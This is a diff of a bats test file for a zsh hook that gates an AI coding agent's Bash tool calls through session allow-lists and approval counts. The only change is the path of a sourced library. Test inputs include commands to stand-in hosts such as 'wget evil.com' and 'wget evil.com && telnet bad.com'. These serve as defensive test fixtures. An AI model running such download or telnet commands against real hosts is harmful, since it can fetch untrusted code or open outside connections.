@@ -95,7 +95,7 @@ setup() {
 }
 
 @test "integration: a binary in the session allow-list is auto-approved" {
-  bats_run_zsh "CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../Bash-approval.zsh'; sessionAllowListAdd --command wget"
+  bats_run_zsh "CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'; sessionAllowListAdd --command wget"
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
@@ -103,7 +103,7 @@ setup() {
 }
 
 @test "integration: reason only mentions binaries missing from the session allow-list" {
-  bats_run_zsh "CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../Bash-approval.zsh'; sessionAllowListAdd --command wget"
+  bats_run_zsh "CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'; sessionAllowListAdd --command wget"
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com && telnet bad.com"}}'
   [[ "$status" -eq 0 ]]
@@ -263,7 +263,7 @@ setup() {
   [[ "$status" -eq 0 ]]
   expect_json '.hookSpecificOutput.permissionDecision' 'ask'
 
-  bats_run_zsh "CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../Bash-approval.zsh'; approvalPendingGet --tool-use-id toolu_01"
+  bats_run_zsh "CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'; approvalPendingGet --tool-use-id toolu_01"
   [[ "$output" = $'wget\ncurl' ]]
 }
 
@@ -276,7 +276,7 @@ setup() {
   }
   bats_mock solkanEvaluate
 
-  local sourcePrefix="CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../Bash-approval.zsh'"
+  local sourcePrefix="CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'"
   bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command wget"
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
@@ -293,7 +293,7 @@ setup() {
   }
   bats_mock solkanEvaluate
 
-  local sourcePrefix="CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../Bash-approval.zsh'"
+  local sourcePrefix="CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'"
   bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command /usr/bin/grep"
   bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command /usr/bin/grep"
 
